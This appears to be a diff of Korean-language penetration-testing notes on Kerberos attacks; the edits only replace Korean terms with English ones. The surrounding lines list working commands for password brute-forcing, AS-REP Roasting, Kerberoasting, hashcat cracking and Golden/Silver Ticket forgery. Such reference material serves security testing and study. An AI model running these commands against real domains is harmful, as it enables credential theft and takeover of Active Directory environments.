@@ -8,7 +8,7 @@ sequenceDiagram
     participant AS as KDC (AS)
     participant TGS as KDC (TGS)
     participant S as Service
-    C->>AS: AS-REQ (사용자 해시로 암호화)
+    C->>AS: AS-REQ (사용자 hash로 암호화)
     AS-->>C: AS-REP (TGT 발급)
     C->>TGS: TGS-REQ (TGT 제시)
     TGS-->>C: TGS-REP (Service Ticket 발급)
@@ -58,7 +58,7 @@ kerbrute bruteuser -d domain.local --dc DC_IP passwords.txt username
 
 ## AS-REP Roasting
 
-Pre-Authentication이 비활성화된 계정의 TGT를 요청하여 오프라인 크래킹.
+Pre-Authentication이 비활성화된 계정의 TGT를 요청하여 오프라인 cracking.
 
 ```bash
 # 계정 목록이 있을 때
@@ -70,7 +70,7 @@ impacket-GetNPUsers DOMAIN/user:pass -dc-ip DC_IP -request
 # nxc
 nxc ldap DC_IP -u user -p pass --asreproast
 
-# 크래킹 (hashcat mode 18200)
+# cracking (hashcat mode 18200)
 hashcat -m 18200 asrep_hashes.txt wordlist.txt
 ```
 
@@ -78,7 +78,7 @@ hashcat -m 18200 asrep_hashes.txt wordlist.txt
 
 ## Kerberoasting
 
-SPN이 설정된 서비스 계정의 TGS를 요청하여 오프라인 크래킹.
+SPN이 설정된 서비스 계정의 TGS를 요청하여 오프라인 cracking.
 
 ```bash
 # Impacket
@@ -90,7 +90,7 @@ nxc ldap DC_IP -u user -p pass --kerberoasting
 # Rubeus (Windows)
 .\Rubeus.exe kerberoast /outfile:hashes.txt
 
-# 크래킹 (hashcat mode 13100)
+# cracking (hashcat mode 13100)
 hashcat -m 13100 tgs_hashes.txt wordlist.txt
 ```
 
@@ -134,11 +134,11 @@ sudo rdate -n DC_IP
 ## Golden / Silver Ticket
 
 ```bash
-# Golden Ticket (krbtgt 해시 필요)
+# Golden Ticket (krbtgt hash 필요)
 impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain domain.local administrator
 export KRB5CCNAME=administrator.ccache
 
-# Silver Ticket (서비스 계정 해시 필요)
+# Silver Ticket (서비스 계정 hash 필요)
 impacket-ticketer -nthash SVC_HASH -domain-sid S-1-5-21-... -domain domain.local -spn cifs/target.domain.local administrator
 export KRB5CCNAME=administrator.ccache
 ```
